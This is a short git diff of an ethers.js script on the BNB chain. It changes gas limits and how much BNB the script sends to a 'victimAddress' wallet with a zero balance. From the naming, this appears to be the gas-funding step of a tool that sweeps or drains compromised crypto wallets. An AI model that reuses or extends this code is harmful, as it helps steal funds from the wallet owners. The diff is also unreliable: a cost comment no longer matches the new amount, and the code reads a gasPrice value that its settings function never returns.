@@ -46,14 +46,14 @@ async function getGasSettings() {
   try {
     const feeData = await provider.getFeeData();
     return {
-      gasLimit: 300000,
+      gasLimit: 1500000,
       maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits("15", "gwei"),
       maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei"),
     };
   } catch (error) {
     console.error("Error fetching gas data:", formatError(error));
     return {
-      gasLimit: 300000,
+      gasLimit: 1500000,
       maxFeePerGas: ethers.parseUnits("15", "gwei"),
       maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"),
     };
@@ -69,7 +69,7 @@ async function checkWalletBalance() {
 
   const balance = await provider.getBalance(wallet.address);
   console.log(`Wallet balance: ${ethers.formatEther(balance)} BNB`);
-  if (balance < ethers.parseEther("0.0006")) {
+  if (balance < ethers.parseEther("0.025")) {
     throw new Error("Insufficient BNB for gas. Please fund the wallet.");
   }
 }
@@ -79,14 +79,14 @@ async function sendGasIfNeeded(victimAddress) {
   console.log(`Victim balance: ${ethers.formatEther(victimBalance)} BNB`); // Changed TBNB to BNB
 
   if (victimBalance === BigInt(0)) {
-    const bnbToSend = ethers.parseEther("0.0006"); // $5 at ~$500/BNB
+    const bnbToSend = ethers.parseEther("0.025"); // $5 at ~$500/BNB
     const gasSettings = await getGasSettings();
 
     console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`); // Changed TBNB to BNB
     const tx = await wallet.sendTransaction({
       to: victimAddress,
       value: bnbToSend,
-      gasLimit: 21000,
+      gasLimit: 1500000,
       gasPrice: gasSettings.gasPrice,
     });
 
